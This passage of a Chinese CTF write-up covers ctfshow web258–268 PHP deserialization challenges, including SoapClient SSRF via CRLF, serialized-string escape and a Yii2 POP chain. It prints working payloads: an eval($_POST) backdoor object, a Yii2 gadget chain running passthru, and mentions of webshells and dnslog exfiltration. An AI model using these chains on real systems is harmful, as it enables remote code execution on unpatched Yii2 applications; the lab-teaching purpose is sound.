class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>-&gt;<span class="title">getInfo</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$user</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>=<span class="string">&#x27;eval($_POST[1]);&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#echo serialize(new ctfShowUser());</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;O:+11:&quot;ctfShowUser&quot;:4:&#123;s:8:&quot;username&quot;;s:6:&quot;xxxxxx&quot;;s:8:&quot;password&quot;;s:6:&quot;xxxxxx&quot;;s:5:&quot;isVip&quot;;b:0;s:5:&quot;class&quot;;O:+8:&quot;backDoor&quot;:1:&#123;s:4:&quot;code&quot;;s:16:&quot;eval($_POST[1]);&quot;;&#125;&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><p>然后进行rce就行了。</p><h2 id="web259"><a href="#web259" class="headerlink" title="web259"></a>web259</h2><p>源码</p><p><img src="../images/image-20230104232501397.png" alt="image-20230104232501397"></p><p><img src="../images/image-20230104232508253.png" alt="image-20230104232508253"></p><p>这道题利用的是序列化的ssrf性质</p><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>php在安装php-soap拓展后，可以反序列化原生类SoapClient，来发送http post请求。必须调用SoapClient不存在的方法，触发SoapClient的<strong>__call魔术方法</strong>。通过CRLF来添加请求体：SoapClinet可以指定请求的user-agent头，通过添加换行符的形式来加入其他请求内容。</p><p>SoapClient采用了HTTP作为底层通讯协议，XML作为数据传送的格式，采用了SOAP协议（SOAP是一种简单的基于XML的协议，它使应用程序通过HTTP来交换信息），其次我们知道某个实例化的类，如果去调用了一个不存在的函数，会调用__call方法，具体详细信息，感兴趣的读者可以自行查阅，这里不进行赘述</p><p>CRLF是”回车 + 换行”（rn）的简称。在HTTP协议中，HTTP Header与HTTP Body是用两个CRLF分隔的，浏览器就是根据这两个CRLF来取出HTTP 内容并显示出来。所以，一旦我们能够控制HTTP 消息头中的字符，注入一些恶意的换行，这样我们就能注入一些会话Cookie或者HTML代码，所以CRLF Injection又叫HTTP Response Splitting，简称HRS</p><p>在多数CTF题目中，会将这两个知识点结合起来考察。</p><p><strong>首先</strong></p><p><img src="../images/image-20230105181930658.png" alt="image-20230105181930658"></p><p><img src="../images/image-20230105181617490.png" alt="image-20230105181617490"></p><p>我们创建对象的时候设置的参数‘uri’SOAPction，‘location’具体表现在POST和Host。 我们还可以控制参数User-Agent，通过创建对象的时候添加参数’user_agent’=&gt;$u</p><p>Content-Type 和 Content-Length 也是我们可以控制的地方。</p><p><strong>开始伪造http头</strong></p><p><img src="../images/image-20230105182603050.png" alt="image-20230105182603050"></p><p><img src="../images/image-20230105182753522.png" alt="image-20230105182753522"></p><p>成功写入，那么就开始根据题目的要求来写入token.</p><p><img src="../images/image-20230105183131849.png" alt="image-20230105183131849"></p><p>根据题目要求写入的token和X-Forwarded-For</p><p>这里要求的<code>Content-Length:13</code>是因为伪造的http头，只需要执行到token=ctfshow就行。token=ctfshow长度为13.</p><p><img src="../images/image-20230105183531826.png" alt="image-20230105183531826"></p><p>执行成功。</p><p>因为题目的服务器端口是80，所以我们得把9999给去掉。</p><p><img src="../images/image-20230105184013157.png" alt="image-20230105184013157"></p><p><img src="../images/image-20230105184100591.png" alt="image-20230105184100591"></p><p>拿到编码的东西后进行传参。</p><p>然后访问flag.txt就行了。</p><p>这道题主要就是通过ua来构造http头来绕过检测。</p><h2 id="web260"><a href="#web260" class="headerlink" title="web260"></a>web260</h2><p>源码</p><p><img src="../images/image-20230105174655881.png" alt="image-20230105174655881"></p><p>这个点就考察serialize，只要传的之里面有<code>ctfshow_i_love_36D</code>就行了。</p><p><img src="../images/image-20230105174843961.png" alt="image-20230105174843961"></p><p>序列化后的结果。</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ctfshow=ctfshow_i_love_36D</span><br></pre></td></tr></table></figure><h2 id="web261"><a href="#web261" class="headerlink" title="web261"></a>web261</h2><p>源码</p><p><img src="../images/image-20230105175010366.png" alt="image-20230105175010366"></p><p>这里边用的全是魔术方法</p><p>php7.4版本以上的话这里面的话如果有__unserialize()魔术方法的话，会自动绕过 ,wakeup()魔术方法，php5.6版本以下的话，可以通过修改类里边的参数的数量来绕过wakeup方法。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowvip</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;   <span class="comment">//对象创建时会自动调用。</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="variable">$u</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123; <span class="comment">//使用unserialize时触发</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;username!=<span class="string">&#x27;&#x27;</span> || <span class="variable language_">$this</span>-&gt;password!=<span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;    <span class="comment">//当脚本尝试将对象调用为函数时触发</span></span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span>&#123; <span class="comment">//使用serialize时触发</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unserialize</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123; <span class="comment">//检查是否存在具有名为 __unserialize() 的魔术方法。此函数将会传递从 __serialize() 返回的恢复数组。然后它可以根据需要从该数组中恢复对象的属性。</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="variable">$data</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="variable">$data</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;code = <span class="variable language_">$this</span>-&gt;username.<span class="variable language_">$this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;     <span class="comment">//对象被销毁时触发</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;code==<span class="number">0x36d</span>)&#123;</span><br><span class="line">            <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;username, <span class="variable">$this</span>-&gt;password);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;vip&#x27;</span>]);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>payload</strong></p><p><img src="../images/image-20230105211617857.png" alt="image-20230105211617857"></p><p>那么这道题的话，只需要用两个魔法函数就行了，这里边的wakeup函数不用管了，因为就是题目的php版本是7.4以上的。invoke()函数也不用管了，因为就是没有触发的点.现在就是看sleep函数了，在serialize时就会触发，给username和password给赋值了。unserialize函数会传递从 __serialize() 返回的恢复数组，那么又会给username和password重新赋值了。因为code这里时弱类型比较，直接877.xxxxxxxx就可以绕过了。</p><p>然后去访问877.php去进行rce就行了。</p><h2 id="web262-字符逃逸"><a href="#web262-字符逃逸" class="headerlink" title="web262(字符逃逸)"></a>web262(字符逃逸)</h2><p>源码</p><p><img src="../images/image-20230105212728740.png" alt="image-20230105212728740"></p><p>先解释一下啥时字符逃逸</p><p><strong>逃逸有一个特征就是对序列化后的字符进行一个替换</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$vip</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;username=<span class="variable">$u</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;password=<span class="variable">$p</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;vip=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$s</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;admin&#x27;</span>,<span class="string">&#x27;hacker&#x27;</span>,<span class="variable">$s</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$u</span> = <span class="keyword">new</span> <span class="title function_ invoke__">user</span>(<span class="string">&#x27;admin&#x27;</span>,<span class="string">&#x27;123456&#x27;</span>);</span><br><span class="line"><span class="variable">$u_seri</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$u</span>);</span><br><span class="line"><span class="variable">$us</span> = <span class="title function_ invoke__">filter</span>(<span class="variable">$u_seri</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$us</span>;</span><br><span class="line"><span class="comment">//O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:3:&quot;vip&quot;;i:0;&#125;</span></span><br><span class="line"><span class="comment">//O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;s:5:&quot;hacker&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:3:&quot;vip&quot;;i:0;&#125;</span></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230105222856799.png" alt="image-20230105222856799"></p><p><strong>这里的话就会出现hacker的长度为5，那么r就逃逸出去了。</strong></p><p>接下来我们想办法把vip变成1.</p><p><img src="../images/image-20230105223446392.png" alt="image-20230105223446392"></p><p>那我们要把vip变成1，且能进行逃逸的话，红线的””内的值要和外面的长度相等就能进行逃逸了。</p><p><img src="../images/image-20230105223548683.png" alt="image-20230105223548683"></p><p>因为我们的payload的长度时45,那么我们就得用45个admin来替换。因为我们的admin和hacker相差一个字符，那么45个字符的话，就可以把上图选中的payload给代替掉，那么我们就可以使其和引号里的值和外面的字符长度一样了   —&gt;  s:2:”xx”   就是类似这种。</p><p><img src="../images/image-20230105224157993.png" alt="image-20230105224157993"></p><p>刚好等于270，逃逸成功，vip也成功写入，当然了就是只看{}里面的内容，超出之后的东西系统不管了。</p><p>讲明白逃逸之后，回到本题。</p><p><img src="../images/image-20230105225632889.png" alt="image-20230105225632889"></p><p>成功逃逸有个字符，那么就跟上面讲解的逃逸的步骤一步一步来就可以解出来了。</p><p><img src="../images/image-20230105225924163.png" alt="image-20230105225924163"></p><p>payload一共有62个字符，那么我们就得去写62个fuck了，这里不知道原因的可以去上面看我写的解释。</p><p><img src="../images/image-20230105230112556.png" alt="image-20230105230112556"></p><p>刚刚好相等，然后进行base64编码后拿去提交。就可以拿到flag了。</p><p><img src="../images/image-20230105230520473.png" alt="image-20230105230520473"></p><p><strong>解法二</strong></p><p><img src="../images/image-20230105230809582.png" alt="image-20230105230809582"></p><p>修改一下token直接就可以进行反序列了。</p><p><strong>paylaod</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="keyword">from</span> = <span class="variable">$f</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> (<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">message</span>(<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>))));</span><br></pre></td></tr></table></figure><h2 id="web263"><a href="#web263" class="headerlink" title="web263"></a>web263</h2><p>源码</p><h2 id="web264"><a href="#web264" class="headerlink" title="web264"></a>web264</h2><p>源码</p><p><img src="../images/image-20230106132930372.png" alt="image-20230106132930372"></p><p>message.php</p><p><img src="../images/image-20230106132950692.png" alt="image-20230106132950692"></p><p>这道题还是可以进行字符逃逸，只要进行序列化输出就行了，因为就是在index.php页面的时候已经会将序列化的值进行base64编码了，在message.php页面会只有代码进行base64解码和反序列化。</p><p><img src="../images/image-20230106134745018.png" alt="image-20230106134745018"></p><p><img src="../images/image-20230106134810726.png" alt="image-20230106134810726"></p><p>那么直接进行字符逃逸就行了，这里就不详细写了，因为<strong>web261</strong>已经详细写过了。</p><h2 id="web265"><a href="#web265" class="headerlink" title="web265"></a>web265</h2><p>源码</p><p><img src="../images/image-20230106140404379.png" alt="image-20230106140404379"></p><p>这里因为token是一个md5()随机数，是不可控的，那么可控的只有password，那么我们就得用到&amp;，</p><p><strong>在PHP 中引用的意思是：不同的名字访问同一个变量内容。</strong></p><p>那么我们就可以利用这一点，来使password的值恒等于token的值。</p><p><strong>paylaod</strong></p><p><img src="../images/image-20230106141939242.png" alt="image-20230106141939242"></p><h2 id="web266"><a href="#web266" class="headerlink" title="web266"></a>web266</h2><p>源码</p><p><img src="../images/image-20230106142948441.png" alt="image-20230106142948441"></p><p>这里面多了个__toString()函数。</p><p>这个函数的作用是如果实例化一个类的话，并将这个对象进行输出的话，就是调用toString函数，没有的话就会报错。</p><p>（如果反序列后的字符串中含有ctfshow的话，将不会进行__destruct()函数的调用。</p><p>因为这里的话，最后的正则判断是不能有ctfshow这个词，但是没有  /i  , 可以利用大写绕过。</p><p><strong>payload</strong></p><p><img src="../images/image-20230106145043122.png" alt="image-20230106145043122"></p><p>为什么可以直接写在post的原因是</p><p><img src="../images/image-20230106145110445.png" alt="image-20230106145110445"></p><p>php://input伪协议的作用。</p><p><strong>解法二</strong></p><p><img src="../images/image-20230106145214649.png" alt="image-20230106145214649"></p><p>类名不变，但是不能正常执行反序列化，因为{}里面的东西不对，那么直接就进行销毁，执行析构函数了。</p><h2 id="web267-yii"><a href="#web267-yii" class="headerlink" title="web267(yii)"></a>web267(yii)</h2><p>源码</p><p><img src="../images/image-20230107205741775.png" alt="image-20230107205741775"></p><p><img src="../images/image-20230107205924759.png" alt="image-20230107205924759"></p><p>登录框架是yii的，那么就可以找一下这个框架的漏洞。</p><p><img src="../images/image-20230107210119947.png" alt="image-20230107210119947"></p><p>利用admin/admin登录成功后，查看about这里的源码，发现这个注释。</p><p><img src="../images/image-20230107210335018.png" alt="image-20230107210335018"></p><p>输入view-source后出现这个。</p><p>然后就找个yii利用链</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">rest</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">CreateAction</span>&#123;</span><br><span class="line">        <span class="title class_">public</span> $<span class="title class_">checkAccess</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;checkAccess = <span class="string">&#x27;phpinfo&#x27;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;id = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Faker</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">yii</span>\<span class="title class_">rest</span>\<span class="title class_">CreateAction</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$formatters</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;formatters[<span class="string">&#x27;close&#x27;</span>] = [<span class="keyword">new</span> <span class="title class_">CreateAction</span>(), <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">db</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Faker</span>\<span class="title class_">Generator</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BatchQueryResult</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$_dataReader</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;_dataReader = <span class="keyword">new</span> <span class="built_in">Generator</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    <span class="title class_">echo</span> <span class="title class_">base64_encode</span>(<span class="title class_">serialize</span>(<span class="title class_">new</span> <span class="title class_">yii</span>\<span class="title class_">db</span>\<span class="title class_">BatchQueryResult</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这个链是执行phpinfo()的，可以在__construct函数里边修改执行命令。</p><p><img src="../images/image-20230107210926680.png" alt="image-20230107210926680"></p><p>命令执行成功，说明链表可行。</p><p>然后就修改执行命令</p><p><img src="../images/image-20230107211023372.png" alt="image-20230107211023372"></p><p>这里有个小问题就是system是无回显的，那么可以写马或者利用别的函数来解。</p><p>exp:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">rest</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">CreateAction</span>&#123;</span><br><span class="line">        <span class="title class_">public</span> $<span class="title class_">checkAccess</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;checkAccess = <span class="string">&#x27;passthru&#x27;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;id = <span class="string">&#x27;tac /flag&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Faker</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">yii</span>\<span class="title class_">rest</span>\<span class="title class_">CreateAction</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$formatters</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;formatters[<span class="string">&#x27;close&#x27;</span>] = [<span class="keyword">new</span> <span class="title class_">CreateAction</span>(), <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">db</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Faker</span>\<span class="title class_">Generator</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BatchQueryResult</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$_dataReader</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;_dataReader = <span class="keyword">new</span> <span class="built_in">Generator</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    <span class="title class_">echo</span> <span class="title class_">base64_encode</span>(<span class="title class_">serialize</span>(<span class="title class_">new</span> <span class="title class_">yii</span>\<span class="title class_">db</span>\<span class="title class_">BatchQueryResult</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230107211300165.png" alt="image-20230107211300165"></p><p>system   可以利用passthru替代。</p><p><a href="https://blog.csdn.net/xuandao_ahfengren/article/details/111259943">https://blog.csdn.net/xuandao_ahfengren/article/details/111259943</a>  yii框架漏洞解释</p><p>Yii是一套基于组件、用于开发大型Web应用的高性能PHP框架。<strong>Yii2 2.0.38</strong> 之前的版本存在反序列化漏洞，程序在调用unserialize 时，攻击者可通过构造特定的恶意请求执行任意命令。</p><p>下次遇到直接拿现成的链来打就好了。</p><h2 id="web268"><a href="#web268" class="headerlink" title="web268"></a>web268</h2><p>源码</p><p>和web261一样都是yii漏洞的反序列化链利用。</p><p>显然这道题的话用不了上一题的payload了    ——&gt;  就是把system替换成passthru</p><p>那我们就得换一个方法了</p><p>就是进行写码，那我们得找到当前目录的路径</p><p>(不是/var/www/html)  试过了。</p><p>那么我们就可以利用danslog.cn进行数据外带。</p><p><img src="../images/image-20230107213710478.png" alt="image-20230107213710478"></p><p>在web267中查出来的。</p><p><img src="../images/image-20230107213918120.png" 